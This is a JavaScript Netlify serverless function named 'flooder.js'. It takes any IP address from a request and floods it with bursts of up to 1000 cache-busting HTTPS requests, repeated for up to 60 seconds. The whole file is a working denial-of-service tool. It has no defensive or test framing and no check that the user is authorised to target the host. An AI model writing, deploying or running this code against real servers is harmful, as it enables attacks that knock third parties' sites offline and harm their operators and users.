// netlify/functions/flooder.js
exports.handler = async function(event, context) {
  // Dynamically import node-fetch to avoid ES module require error
  const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

  try {
    const { ip, requests, delay, duration } = JSON.parse(event.body);

    if (!ip) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: "Missing IP address" }),
      };
    }

    const burstCount = Math.min(Math.max(parseInt(requests, 10) || 10, 1), 1000);
    const burstDelay = Math.min(Math.max(parseInt(delay, 10) || 100, 10), 5000);
    const floodDuration = Math.min(Math.max(parseInt(duration, 10) || 10, 1), 60); // seconds

    const endTime = Date.now() + floodDuration * 1000;
    let totalSent = 0;

    async function sendRequest(target) {
      try {
        await fetch(target, { mode: 'no-cors' });
        return true;
      } catch {
        return false;
      }
    }

    while (Date.now() < endTime) {
      const promises = [];
      for (let i = 0; i < burstCount; i++) {
        // Add cache bust to avoid caching
        const url = `https://${ip}/?cachebust=${Date.now()}_${Math.random()}`;
        promises.push(sendRequest(url));
      }
      await Promise.all(promises);
      totalSent += burstCount;
      await new Promise(r => setTimeout(r, burstDelay));
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ message: `Flood finished. Total requests sent: ${totalSent}` }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: err.message }),
    };
  }
};
